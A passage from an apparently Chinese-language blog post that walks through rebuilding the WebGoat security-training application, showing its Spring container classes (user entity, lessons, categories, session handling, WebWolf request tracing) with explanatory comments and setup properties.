取出用户配置中的路径信息</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@Scope(value = &quot;session&quot;,proxyMode = ScopedProxyMode.TARGET_CLASS)</span></span><br><span class="line">    <span class="keyword">public</span> WebSession <span class="title function_">webSession</span><span class="params">()</span>&#123;<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">WebSession</span>();&#125;</span><br><span class="line"><span class="comment">//    根据session类创建返回一个session对象</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="meta">@Scope(value = &quot;session&quot;,proxyMode = ScopedProxyMode.TARGET_CLASS)</span></span><br><span class="line">    <span class="keyword">public</span> UserSessionData <span class="title function_">userSessionData</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">UserSessionData</span>(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;data&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RestTemplate <span class="title function_">restTemplate</span><span class="params">()</span>&#123;<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="users"><a href="#users" class="headerlink" title="users"></a>users</h2><h3 id="WebGoatUser"><a href="#WebGoatUser" class="headerlink" title="WebGoatUser"></a>WebGoatUser</h3><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220702170759289.png" alt="image-20220702170759289"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220702170920741.png" alt="image-20220702170920741"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220702171034696.png" alt="image-20220702171034696"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.users;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.GrantedAuthority;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.authority.SimpleGrantedAuthority;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.User;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.userdetails.UserDetails;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.persistence.Entity;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.Id;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.Transient;</span><br><span class="line"><span class="keyword">import</span> java.util.Collection;</span><br><span class="line"><span class="keyword">import</span> java.util.Collections;</span><br><span class="line"><span class="keyword">import</span> java.util.Objects;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="comment">// @Entity是指这个类映射到数据库表</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebGoatUser</span> <span class="keyword">implements</span> <span class="title class_">UserDetails</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ROLE_USER</span> <span class="operator">=</span> <span class="string">&quot;WEBGOAT_USER&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ROLE_ADMIN</span>  <span class="operator">=</span> <span class="string">&quot;WEBGOAT_ADMIN&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line"><span class="comment">//    用于声明一个实体类的属性映射为数据库的主键列。该属性通常置于属性声明语句之前，可与声明语句同行，也可写在单独行上。</span></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">role</span> <span class="operator">=</span> ROLE_USER;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transient</span></span><br><span class="line"><span class="comment">//    java 的transient关键字的作用是需要实现Serilizable接口，将不需要序列化的属性前添加关键字transient，序列化对象的时候，这个属性就不会序列化到指定的目的地中。</span></span><br><span class="line">    <span class="keyword">private</span> User user;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="title function_">WebGoatUser</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WebGoatUser</span><span class="params">(String username,String password)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>(username,password,ROLE_USER);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WebGoatUser</span><span class="params">(String username,String password,String role)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.username = username;</span><br><span class="line">        <span class="built_in">this</span>.password = password;</span><br><span class="line">        <span class="built_in">this</span>.role = role;</span><br><span class="line">        createUser();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">createUser</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.user = <span class="keyword">new</span> <span class="title class_">User</span>(username,password,getAuthorities());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getRole</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> role;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> o <span class="keyword">instanceof</span> WebGoatUser webGoatUser &amp;&amp; <span class="built_in">this</span>.user.equals(webGoatUser.user);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> user.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Collection&lt;? <span class="keyword">extends</span> <span class="title class_">GrantedAuthority</span>&gt; getAuthorities() &#123;</span><br><span class="line">        <span class="keyword">return</span> Collections.singleton(<span class="keyword">new</span> <span class="title class_">SimpleGrantedAuthority</span>(getRole()));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAccountNonExpired</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.user.isAccountNonExpired();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAccountNonLocked</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.user.isAccountNonLocked();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isCredentialsNonExpired</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.user.isCredentialsNonExpired();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEnabled</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.user.isEnabled();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="lessons"><a href="#lessons" class="headerlink" title="lessons"></a>lessons</h2><h3 id="Assignment"><a href="#Assignment" class="headerlink" title="Assignment"></a>Assignment</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.lessons;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.EqualsAndHashCode;</span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.persistence.*;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Getter</span></span><br><span class="line"><span class="meta">@EqualsAndHashCode</span></span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Assignment</span> &#123;</span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="meta">@GeneratedValue(strategy = GenerationType.AUTO)</span></span><br><span class="line"><span class="comment">//    场景：公司开发使用Mysql数据库，生产使用Oracle数据库，当同时使用两种数据库时，JPA主键生成策略可以选择GenerationType.Auto来实现。</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String path;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transient</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;String &gt; hints;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Assignment</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Assignment</span><span class="params">(String name,String path,List&lt;String&gt; hints)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (path.equals(<span class="string">&quot;&quot;</span>) || path.equals(<span class="string">&quot;/&quot;</span>) || path.equals(<span class="string">&quot;/WebGoat/&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;The path of assignment &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; overrides WebGoat endpoints, please choose a path within the scope of the lesson&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.path = path;</span><br><span class="line">        <span class="built_in">this</span>.hints = hints;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Lesson"><a href="#Lesson" class="headerlink" title="Lesson"></a>Lesson</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.lessons;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jdk.jfr.Category;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Lesson</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">Integer</span> <span class="variable">id</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> List&lt;Assignment&gt; assignments;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Lesson</span><span class="params">()</span> &#123;</span><br><span class="line">        id =++count;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> getClass().getName();</span><br><span class="line">        <span class="keyword">return</span> className.substring(className.lastIndexOf(<span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    返回本类名</span></span><br><span class="line">    <span class="keyword">public</span> Category <span class="title function_">getCategory</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> getDefaultCategory();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">abstract</span> Category <span class="title function_">getDefaultCategory</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> String <span class="title function_">getTitle</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> String <span class="title function_">getPath</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;#lesson/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getLink</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;%s%s.lesson&quot;</span>,getPath(),getId());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">getId</span><span class="params">()</span>&#123;<span class="keyword">return</span> <span class="built_in">this</span>.getClass().getSimpleName();&#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;<span class="keyword">return</span> getTitle();&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> String <span class="title function_">getPackage</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">packageName</span>  <span class="operator">=</span> <span class="built_in">this</span>.getClass().getPackageName();</span><br><span class="line">        <span class="keyword">return</span> packageName.replaceAll(<span class="string">&quot;com.wanan.webgoat.lessons&quot;</span>,<span class="string">&quot;&quot;</span>).replaceAll(<span class="string">&quot;\\..*&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Category"><a href="#Category" class="headerlink" title="Category"></a>Category</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.lessons;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Getter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">Category</span> &#123;</span><br><span class="line">    INTRODUCTION(<span class="string">&quot;Introduction&quot;</span>,<span class="number">5</span>),</span><br><span class="line">    GENERAL(<span class="string">&quot;General&quot;</span>,<span class="number">100</span>),</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    A1(<span class="string">&quot;(A1) Broken Access Control&quot;</span>, <span class="number">301</span>),</span><br><span class="line">    A2(<span class="string">&quot;(A2) Cryptographic Failures&quot;</span>, <span class="number">302</span>),</span><br><span class="line">    A3(<span class="string">&quot;(A3) Injection&quot;</span>, <span class="number">303</span>),</span><br><span class="line"></span><br><span class="line">    A5(<span class="string">&quot;(A5) Security Misconfiguration&quot;</span>, <span class="number">305</span>),</span><br><span class="line">    A6(<span class="string">&quot;(A6) Vuln &amp; Outdated Components&quot;</span>, <span class="number">306</span>),</span><br><span class="line">    A7(<span class="string">&quot;(A7) Identity &amp; Auth Failure&quot;</span>, <span class="number">307</span>),</span><br><span class="line">    A8(<span class="string">&quot;(A8) Software &amp; Data Integrity&quot;</span>, <span class="number">308</span>),</span><br><span class="line">    A9(<span class="string">&quot;(A9) Security Logging Failures&quot;</span>, <span class="number">309</span>),</span><br><span class="line">    A10(<span class="string">&quot;(A10) Server-side Request Forgery&quot;</span>, <span class="number">310</span>),</span><br><span class="line"></span><br><span class="line">    CLIENT_SIDE(<span class="string">&quot;Client side&quot;</span>, <span class="number">1700</span>),</span><br><span class="line"></span><br><span class="line">    CHALLENGE(<span class="string">&quot;Challenges&quot;</span>, <span class="number">3000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Getter</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="meta">@Getter</span></span><br><span class="line">    <span class="keyword">private</span> Integer ranking;</span><br><span class="line">    Category(String name,Integer ranking)&#123;</span><br><span class="line">        <span class="built_in">this</span>.name= name;</span><br><span class="line">        <span class="built_in">this</span>.ranking = ranking;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span>&#123;<span class="keyword">return</span> getName();&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="WebSession"><a href="#WebSession" class="headerlink" title="WebSession"></a>WebSession</h3><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220702170315844.png" alt="image-20220702170315844"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220702170401824.png" alt="image-20220702170401824"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.session;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.lessons.Lesson;</span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.container.users.WebGoatUser;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.core.context.SecurityContextHolder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serial;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebSession</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">8965787678158574766L</span>;</span><br><span class="line"><span class="comment">//    可序列化</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> WebGoatUser currentUser;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> Lesson currentLesson;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> securityEnabled;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WebSession</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.currentUser = (WebGoatUser) SecurityContextHolder.getContext().getAuthentication().getPrincipal();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    获取当前用户</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCurrentLesson</span><span class="params">(Lesson lesson)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.currentLesson = lesson;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Lesson <span class="title function_">getCurrentLesson</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.currentLesson;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUserName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> currentUser.getUsername();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> WebGoatUser <span class="title function_">getUser</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> currentUser;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">toggleSecurity</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.securityEnabled = !<span class="built_in">this</span>.securityEnabled;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isSecurityEnable</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> securityEnabled;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><h3 id="UserSessionData"><a href="#UserSessionData" class="headerlink" title="UserSessionData"></a>UserSessionData</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.container.session;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserSessionData</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> HashMap&lt;String ,Object&gt; userSessionData = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserSessionData</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserSessionData</span><span class="params">(String key,String value)</span>&#123;</span><br><span class="line">        setValue(key,value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">(String key)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!userSessionData.containsKey(key))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> userSessionData.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(String key,Object value)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (userSessionData.containsKey(key))&#123;</span><br><span class="line">            userSessionData.replace(key,value);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            userSessionData.put(key,value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="webwolf"><a href="#webwolf" class="headerlink" title="webwolf"></a>webwolf</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220705180756835.png" alt="image-20220705180756835"></p>
<h2 id="WebWolf"><a href="#WebWolf" class="headerlink" title="WebWolf"></a>WebWolf</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.webwolf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.wanan.webgoat.webwolf.requests.WebWolfTraceRepository;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.actuate.trace.http.HttpTraceRepository;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.EnableAutoConfiguration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.ComponentScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.PropertySource;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="comment">//用于定义配置类</span></span><br><span class="line"><span class="meta">@ComponentScan(&quot;com.wanan.webgoat.webwolf&quot;)</span></span><br><span class="line"><span class="comment">//告诉Spring 哪个packages 的用注解标识的类 会被spring自动扫描并且装入bean容器,param即用来指定扫描包的范围。</span></span><br><span class="line"><span class="meta">@PropertySource(&quot;classpath:application-webwolf.properties&quot;)</span></span><br><span class="line"><span class="comment">//properties类型配置文件</span></span><br><span class="line"><span class="meta">@EnableAutoConfiguration</span></span><br><span class="line"><span class="comment">//@EnableAutoConfiguration就是借助@Import来收集所有符合自动配置条件的bean定义，并加载到IOC容器中</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebWolf</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> HttpTraceRepository <span class="title function_">traceRepository</span><span class="params">()</span>&#123;<span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">WebWolfTraceRepository</span>();&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h2><h3 id="WebWolfTraceRepository"><a href="#WebWolfTraceRepository" class="headerlink" title="WebWolfTraceRepository"></a>WebWolfTraceRepository</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.wanan.webgoat.webwolf.requests;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.google.common.collect.EvictingQueue;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.actuate.trace.http.HttpTrace;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.actuate.trace.http.HttpTraceRepository;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebWolfTraceRepository</span> <span class="keyword">implements</span> <span class="title class_">HttpTraceRepository</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> EvictingQueue&lt;HttpTrace&gt; traces = EvictingQueue.create(<span class="number">10000</span>);</span><br><span class="line"><span class="comment">//    最近N次执行http请求，执行时间超过阈值T的次数大于等于M，则认为当前网络慢 用于缓存</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;String&gt; exclusionList = List.of(<span class="string">&quot;/tmpdir&quot;</span>,<span class="string">&quot;/home&quot;</span>,<span class="string">&quot;/files&quot;</span>,<span class="string">&quot;/images/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;/favicon.ico&quot;</span>,<span class="string">&quot;/js/&quot;</span>,<span class="string">&quot;/webjars&quot;</span>,<span class="string">&quot;/requests&quot;</span>,<span class="string">&quot;/css/&quot;</span>,<span class="string">&quot;/mail&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;HttpTrace&gt; <span class="title function_">findAll</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> List.of();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> List&lt;HttpTrace&gt; <span class="title function_">findAllTraces</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(traces);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isInExclusionList</span><span class="params">(String path)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> exclusionList.stream().anyMatch(e-&gt;path.contains(e));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(HttpTrace httpTrace)</span>&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">path</span> <span class="operator">=</span> httpTrace.getRequest().getUri().getPath();</span><br><span class="line"><span class="comment">//        获取uri路径</span></span><br><span class="line">        <span class="keyword">if</span>(!isInExclusionList(path))&#123;</span><br><span class="line">            traces.add(httpTrace);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="修复异常启动"><a href="#修复异常启动" class="headerlink" title="修复异常启动"></a>修复异常启动</h1><p>这里直接启动肯定会出现非常多的异常,大概就是pom.xml中缺少依赖项目,springboot版本不同.properties配置未添加,</p>
<p>application-webgoat.properties</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">webgoat.user.directory</span>=<span class="string">$&#123;user.home&#125;/.webgoat-$&#123;webgoat.build.version&#125;/</span></span><br><span class="line"></span><br><span class="line"><span class="attr">spring.datasource.url</span>=<span class="string">jdbc:hsqldb:file:$&#123;webgoat.server.directory&#125;/webgoat</span></span><br><span class="line"><span class="attr">spring.datasource.driver-class-name</span>=<span class="string">org.hsqldb.jdbc.JDBCDriver</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">webgoat.build.version</span>=<span class="string">@project.version@</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JWTController</span><br></pre></td></tr></table></figure>

<p>application-webwolf.properties</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="attr">server.port</span>=<span class="string">$&#123;webwolf.port:9090&#125;</span></span><br><span class="line"><span class="attr">spring.application.name</span>=<span class="string">WebWolf</span></span><br></pre></td></tr></table></figure>

